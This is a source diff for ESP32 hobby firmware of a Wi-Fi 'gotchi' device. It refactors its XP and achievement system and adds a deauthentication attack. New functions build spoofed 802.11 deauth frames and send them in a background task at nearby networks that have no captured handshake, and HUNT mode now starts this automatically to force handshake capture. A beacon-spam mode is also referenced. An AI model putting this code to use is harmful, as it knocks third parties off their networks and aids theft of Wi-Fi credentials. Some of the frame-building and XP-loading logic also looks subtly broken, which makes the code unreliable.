@@ -5,6 +5,8 @@
 #include "gotchi.h"
 #include "storage.h"
 #include "gps.h"
+#include "xp_system.h"
+#include "achievement_system.h"
 #include <esp_wifi.h>
 #include <esp_netif.h>
 #include <esp_event.h>
@@ -21,6 +23,7 @@
 #include <freertos/FreeRTOS.h>
 #include <freertos/task.h>
 #include <esp_http_server.h>
+#include <time.h>
 
 static const char* TAG = "gotchi";
 
@@ -28,8 +31,8 @@ namespace gotchi {
 
 static Mode _currentMode = Mode::IDLE;
 static Mood _currentMood = Mood::NEUTRAL;
-static int32_t _xp = 0;
-static int32_t _level = 1;
+static XPSystem _xpSystem;
+static AchievementSystem _achievementSystem;
 static bool _initialized = false;
 static bool _sniffing = false;
 static bool _wifiInitialized = false;
@@ -368,22 +371,6 @@ static int ieee80211_hdrlen(uint16_t fc) {
     return hdrlen;
 }
 
-// StackChan-Gotchi unique level titles - robot personality progression
-static const char* LEVEL_TITLES[] = {
-    "Unit",       // Lv1 - Freshly booted
-    "Watcher",   // Lv2 - Observing networks
-    "Scanner",   // Lv3 - Active scanning
-    "Seeker",    // Lv4 - Finding targets
-    "Prowler",   // Lv5 - Silent operation
-    "Phantom",   // Lv6 - Undetected
-    "Apex",       // Lv7 - Top predator
-    "Omega"      // Lv8 - Network master
-};
-
-static const int XP_PER_LEVEL[] = {
-    0, 50, 150, 350, 700, 1200, 2000, 3500
-};
-
 const char* getModeName(Mode mode) {
     switch (mode) {
         case Mode::IDLE: return "IDLE";
@@ -400,44 +387,15 @@ const char* getModeName(Mode mode) {
 }
 
 const char* getLevelTitle(int level) {
-    if (level < 1) level = 1;
-    if (level > 8) level = 8;
-    return LEVEL_TITLES[level - 1];
+    return _xpSystem.getLevelTitle();
 }
 
 int getXPForLevel(int level) {
-    if (level < 1) level = 1;
-    if (level > 8) level = 8;
-    return XP_PER_LEVEL[level - 1];
+    return _xpSystem.getXPForLevel(level);
 }
 
 int getXPProgress(int32_t xp, int level) {
-    if (level < 1) level = 1;
-    if (level > 8) return 100;  // Max level
-    
-    int currentLevelXP = XP_PER_LEVEL[level - 1];
-    int nextLevelXP = (level < 8) ? XP_PER_LEVEL[level] : XP_PER_LEVEL[7];
-    
-    int xpInLevel = xp - currentLevelXP;
-    int xpNeeded = nextLevelXP - currentLevelXP;
-    
-    if (xpNeeded <= 0) return 100;
-    
-    int progress = (xpInLevel * 100) / xpNeeded;
-    if (progress > 100) progress = 100;
-    if (progress < 0) progress = 0;
-    
-    return progress;
-}
-
-static void updateLevel() {
-    for (int i = 7; i >= 0; i--) {
-        if (_xp >= XP_PER_LEVEL[i]) {
-            _level = i + 1;
-            return;
-        }
-    }
-    _level = 1;
+    return _xpSystem.getXPProgress();
 }
 
 static void loadFromNVS() {
@@ -453,17 +411,21 @@ static void loadFromNVS() {
     uint32_t savedNetworks = 0;
     
     if (nvs_get_i32(nvs, "xp", &savedXP) == ESP_OK) {
-        _xp = savedXP;
+        _xpSystem.addXP(savedXP);
     }
     if (nvs_get_i32(nvs, "level", &savedLevel) == ESP_OK) {
-        _level = savedLevel;
+        (void)savedLevel;
     }
     if (nvs_get_u32(nvs, "netsfound", &savedNetworks) == ESP_OK) {
         _networksFound = savedNetworks;
     }
     
     nvs_close(nvs);
-    ESP_LOGI(TAG, "Loaded from NVS: XP=%d, Level=%d, Networks=%u", (int)_xp, (int)_level, (unsigned)_networksFound);
+    ESP_LOGI(TAG, "Loaded from NVS: XP=%d, Level=%d, Networks=%u", 
+        (int)_xpSystem.getXP(), (int)_xpSystem.getLevel(), (unsigned)_networksFound);
+    
+    _xpSystem.loadFromNVS();
+    _achievementSystem.loadFromNVS();
 }
 
 static void saveToNVS() {
@@ -474,14 +436,18 @@ static void saveToNVS() {
         return;
     }
     
-    nvs_set_i32(nvs, "xp", _xp);
-    nvs_set_i32(nvs, "level", _level);
+    nvs_set_i32(nvs, "xp", _xpSystem.getXP());
+    nvs_set_i32(nvs, "level", _xpSystem.getLevel());
     nvs_set_u32(nvs, "netsfound", _networksFound);
     nvs_set_u32(nvs, "netscnt", (uint32_t)_networks.size());
     nvs_commit(nvs);
     nvs_close(nvs);
     
-    ESP_LOGI(TAG, "Saved to NVS: XP=%d, Level=%d, Networks=%u", (int)_xp, (int)_level, (unsigned)_networks.size());
+    _xpSystem.saveToNVS();
+    _achievementSystem.saveToNVS();
+    
+    ESP_LOGI(TAG, "Saved to NVS: XP=%d, Level=%d, Networks=%u", 
+        (int)_xpSystem.getXP(), (int)_xpSystem.getLevel(), (unsigned)_networks.size());
 }
 
 void init() {
@@ -506,9 +472,13 @@ void init() {
 
     // Load saved XP/level from NVS
     loadFromNVS();
+    
+    // Initialize XP and Achievement systems
+    _xpSystem.init();
+    _achievementSystem.init();
 
     // Initialize GPS
-    initGPS();
+    getGpsManager().init();
 
     // Initialize storage and load config
     if (initStorage()) {
@@ -544,7 +514,7 @@ void update() {
     if (!_initialized) return;
 
     // Update GPS data
-    updateGPS();
+    getGpsManager().update();
 
     uint32_t now = GetHAL().millis();
     uint32_t uptime = (now - _startTime) / 1000;
@@ -570,6 +540,88 @@ void update() {
     if (_networksFound > 0 && (now % 60000) < 100) {
         addXP(1);  // 1 XP per minute regardless of network count
     }
+}
+
+static TaskHandle_t _deauthTaskHandle = nullptr;
+static bool _deauthActive = false;
+
+static void sendDeauthFrame(const uint8_t* bssid, uint8_t reason) {
+    uint8_t deauth[32];
+    memset(deauth, 0, sizeof(deauth));
+    
+    deauth[0] = 0xC0;
+    deauth[1] = 0x00;
+    deauth[2] = 0x00;
+    deauth[3] = 0x00;
+    memcpy(&deauth[4], bssid, 6);
+    memcpy(&deauth[10], bssid, 6);
+    memcpy(&deauth[16], bssid, 6);
+    deauth[22] = reason;
+    
+    esp_wifi_80211_tx(WIFI_IF_STA, deauth, 23, false);
+}
+
+static void deauthTask(void* param) {
+    (void)param;
+    ESP_LOGI(TAG, "Deauth task started");
+    
+    uint32_t lastDeauth = 0;
+    uint32_t deauthCount = 0;
+    
+    while (_deauthActive && _currentMode == Mode::HUNT) {
+        uint32_t now = GetHAL().millis();
+        
+        if (now - lastDeauth > 3000) {
+            lastDeauth = now;
+            
+            const uint8_t DISASSOC_REASON = 0x03;
+            
+            for (const auto& net : _networks) {
+                if (!_deauthActive || _currentMode != Mode::HUNT) break;
+                if (net.hasCapture) continue;
+                if (net.channel != _currentChannel) continue;
+                
+                sendDeauthFrame(net.bssid, DISASSOC_REASON);
+                deauthCount++;
+                
+                vTaskDelay(pdMS_TO_TICKS(50));
+                
+                if (deauthCount >= 5) break;
+            }
+            
+            if (deauthCount % 30 == 0 && deauthCount > 0) {
+                ESP_LOGI(TAG, "Deauth frames sent: %u", deauthCount);
+            }
+        }
+        
+        vTaskDelay(pdMS_TO_TICKS(500));
+    }
+    
+    ESP_LOGI(TAG, "Deauth task stopped, sent %u frames", deauthCount);
+    _deauthActive = false;
+    vTaskDelete(NULL);
+}
+
+static void startDeauth() {
+    if (_deauthActive) return;
+    if (_currentMode != Mode::HUNT) return;
+    
+    ESP_LOGI(TAG, "Starting deauth for handshake capture");
+    _deauthActive = true;
+    xTaskCreate(deauthTask, "deauth_task", 2048, NULL, 3, &_deauthTaskHandle);
+}
+
+static void stopDeauth() {
+    if (!_deauthActive) return;
+    
+    _deauthActive = false;
+    
+    if (_deauthTaskHandle) {
+        vTaskDelay(pdMS_TO_TICKS(100));
+        _deauthTaskHandle = nullptr;
+    }
+    
+    ESP_LOGI(TAG, "Deauth attack stopped");
 }
 
 void shutdown() {
@@ -607,49 +659,53 @@ void setMode(Mode mode) {
     if (_configModeActive) {
         stopConfigMode();
     }
+    if (_deauthActive) {
+        stopDeauth();
+    }
 
     // Start appropriate mode
     switch (mode) {
         case Mode::HUNT:
-            ESP_LOGI(TAG, "Starting HUNT mode (promiscuous)");
+            ESP_LOGI(TAG, "Starting HUNT mode (promiscuous + deauth)");
             _sessionStartTime = GetHAL().millis();
-            _sessionStartXP = _xp;
+            _sessionStartXP = _xpSystem.getXP();
             startSniff();
+            startDeauth();
             break;
         case Mode::SCOUT:
             ESP_LOGI(TAG, "Starting SCOUT mode (active scan)");
             _sessionStartTime = GetHAL().millis();
-            _sessionStartXP = _xp;
+            _sessionStartXP = _xpSystem.getXP();
             startScout();
             break;
         case Mode::WARDIVE:
             ESP_LOGI(TAG, "Starting WARDIVE mode (passive)");
             _sessionStartTime = GetHAL().millis();
-            _sessionStartXP = _xp;
+            _sessionStartXP = _xpSystem.getXP();
             startSniff();
             break;
         case Mode::SPECTRUM:
             ESP_LOGI(TAG, "Starting SPECTRUM mode (passive)");
             _sessionStartTime = GetHAL().millis();
-            _sessionStartXP = _xp;
+            _sessionStartXP = _xpSystem.getXP();
             startSniff();
             break;
         case Mode::BLE_SCAN:
             ESP_LOGI(TAG, "Starting BLE-SCAN mode (BLE scan)");
             _sessionStartTime = GetHAL().millis();
-            _sessionStartXP = _xp;
+            _sessionStartXP = _xpSystem.getXP();
             startBLEScan();
             break;
         case Mode::ROGUE:
             ESP_LOGI(TAG, "Starting ROGUE mode (beacon spam)");
             _sessionStartTime = GetHAL().millis();
-            _sessionStartXP = _xp;
+            _sessionStartXP = _xpSystem.getXP();
             startRogue();
             break;
         case Mode::CONFIG:
             ESP_LOGI(TAG, "Starting CONFIG mode (web server)");
             _sessionStartTime = GetHAL().millis();
-            _sessionStartXP = _xp;
+            _sessionStartXP = _xpSystem.getXP();
             startConfigMode();
             break;
         case Mode::IDLE:
@@ -701,8 +757,8 @@ Mood getCurrentMood() {
 
 Stats getStats() {
     Stats stats;
-    stats.xp = _xp;
-    stats.level = _level;
+    stats.xp = _xpSystem.getXP();
+    stats.level = _xpSystem.getLevel();
     stats.networksFound = _networksFound;
     stats.handshakesCaptured = _handshakesCaptured;
     stats.channelsScanned = _channelsScanned;
@@ -712,7 +768,7 @@ Stats getStats() {
     stats.sessionNetworks = _networks.size();
     stats.sessionTimeSeconds = (GetHAL().millis() - _sessionStartTime) / 1000;
     stats.sessionStartTime = _sessionStartTime;
-    stats.sessionXPGain = _xp - _sessionStartXP;
+    stats.sessionXPGain = _xpSystem.getXP() - _sessionStartXP;
     stats.currentChannel = _currentChannel;
     
     // Heap monitoring
@@ -723,7 +779,7 @@ Stats getStats() {
     stats.minHeap = _minHeapSession;
     
     // GPS data
-    GPSData gps = getGPSData();
+    GPSData gps = getGpsManager().getData();
     stats.gpsValid = gps.valid;
     stats.gpsSatellites = gps.satellites;
     stats.gpsLat = gps.latitude;
@@ -737,43 +793,39 @@ GotchiConfig getConfig() {
 }
 
 void addXP(int32_t amount) {
-    // Apply mode-specific multipliers
+    if (!_initialized) return;
+    if (amount <= 0) return;
+    
+    // Apply mode-specific multipliers to XP
     float multiplier = 1.0f;
     switch (_currentMode) {
         case Mode::WARDIVE:
-            multiplier = 1.5f;  // Active wardriving = bonus XP
+            multiplier = 1.5f;
             break;
         case Mode::SPECTRUM:
-            multiplier = 1.2f;  // Channel analysis is valuable
+            multiplier = 1.2f;
             break;
         case Mode::SCOUT:
-            multiplier = 0.8f;  // Passive scanning = less effort
+            multiplier = 0.8f;
             break;
         case Mode::IDLE:
-            multiplier = 0.0f;  // No XP in idle
+            multiplier = 0.0f;
             break;
         default:
             multiplier = 1.0f;
             break;
     }
     
-    int32_t effectiveAmount = (int32_t)(amount * multiplier);
-    int32_t oldXP = _xp;
-    _xp += effectiveAmount;
-    if (_xp < 0) _xp = 0;
-    updateLevel();
-    
-    // Save to NVS when XP increases (throttled - max once per minute)
-    static uint32_t lastSave = 0;
-    uint32_t now = GetHAL().millis();
-    if (_xp > oldXP && (now - lastSave) > 60000) {
-        lastSave = now;
-        saveToNVS();
-    }
+int32_t effectiveAmount = (int32_t)(amount * multiplier);
+    _xpSystem.addXP(effectiveAmount);
 }
 
 std::vector<NetworkInfo> getNetworks() {
     return _networks;
+}
+
+int getNetworkCount() {
+    return (int)_networks.size();
 }
 
 void startSniff() {
@@ -793,6 +845,7 @@ void startSniff() {
         ret = esp_wifi_set_mode(WIFI_MODE_STA);
         if (ret != ESP_OK) {
             ESP_LOGW(TAG, "WiFi mode set failed: %d", ret);
+            esp_wifi_deinit();
             return;
         }
         vTaskDelay(pdMS_TO_TICKS(100));
@@ -860,6 +913,7 @@ void startScout() {
         ret = esp_wifi_set_mode(WIFI_MODE_STA);
         if (ret != ESP_OK) {
             ESP_LOGW(TAG, "WiFi mode set failed: %d", ret);
+            esp_wifi_deinit();
             return;
         }
         vTaskDelay(pdMS_TO_TICKS(50));
@@ -1696,16 +1750,19 @@ void acknowledgeHuntDisclaimer() {
 }
 
 bool isDeepThoughtUnlocked() {
-    return _level >= 5;
+    return _xpSystem.getLevel() >= 5;
 }
 
 uint32_t getAchievementsBitmask() {
-    return 0;
+    return _achievementSystem.getAchievementsBitmask();
 }
 
 bool getDailyChallenge(ChallengeInfo& challenge) {
-    challenge = {"Daily Scan", "Scan 10 networks", 50, true, false};
-    return true;
+    return _achievementSystem.getDailyChallenge(challenge);
+}
+
+bool completeDailyChallenge() {
+    return _achievementSystem.completeDailyChallenge();
 }
 
 }
